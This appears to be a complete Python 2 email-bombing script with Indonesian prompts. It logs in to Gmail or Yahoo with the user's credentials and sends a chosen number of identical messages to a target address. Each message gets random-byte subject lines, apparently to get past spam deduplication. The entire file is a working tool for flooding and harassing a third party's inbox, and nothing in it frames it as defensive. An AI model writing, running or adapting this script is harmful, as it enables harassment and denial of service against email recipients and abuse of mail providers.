#!/usr/bin/python
#Tools Sederhana
#ByArdi


import os
import smtplib
import getpass
import sys

print ":::::::::::::::::  ToolsSederhana    :::::::::::::::::"
print ":::::::::::::::::   Gmail/Email      :::::::::::::::::"
print ":::::::::::::::::     ByArdi         ::::::::::::::::: "

server = raw_input ('Pilih Gmail/Email?: ')
user = raw_input('Gmailmu/Emailmu: ')
passwd = getpass.getpass('Passwordmu: ')


to = raw_input('\nMasukan Email/Gmail Target: ')
body = raw_input('PesanKamu: ')
total = input('JumlahNya: ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print 'Applies only to gmail and yahoo.'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rE-mails sent: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Sukses Mengirim!!!'
except KeyboardInterrupt:
    print '[-] Batal'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] Mungkin Nama Pengguna Dan Sandi Email Anda Salah'
    sys.exit()